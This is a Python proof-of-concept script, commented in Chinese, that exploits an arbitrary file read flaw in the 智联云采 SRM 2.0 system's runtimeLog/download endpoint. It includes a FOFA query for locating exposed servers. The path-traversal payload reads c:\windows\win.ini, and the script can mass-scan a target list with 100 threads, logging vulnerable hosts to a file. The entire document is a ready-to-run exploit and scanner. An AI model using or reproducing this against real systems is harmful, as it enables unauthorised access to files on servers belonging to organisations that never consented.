#智联云采 SRM2.0 runtimeLog/download 任意文件读取漏洞
#FOFA语法：title=="SRM 2.0"
import sys,requests,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def main():
    parse = argparse.ArgumentParser(description='SRM智联云采系统 download 存在任意⽂件读取漏洞')
    parse.add_argument('-u','--url',dest='url',type=str,help='输入url')
    parse.add_argument('-f','--file',dest='file',type=str,help='输入file名')
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open (args.file,'r',encoding='utf-8')as f:
            for line in f.readlines():
                url_list.append(line.strip())
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        pass
def poc(target):
    payload="/adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:\\windows\win.ini"
    data=''
    proxy={
        'http' :'http://127.0.0.1:7890',
        'https':'http://127.0.0.1:7890'
    }
    headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Connection': 'keep-alive'
    }
    try:
        res1 = requests.get(url=target+payload,headers=headers,timeout=10,verify=False,proxies=proxy)
        if res1.status_code == 200:
            if '[fonts]' in res1.text:
                with open('result.txt','a',encoding='utf-8')as f:
                    f.write(target+'\n')
    except Exception as e:
        pass

if __name__=='__main__':
    main()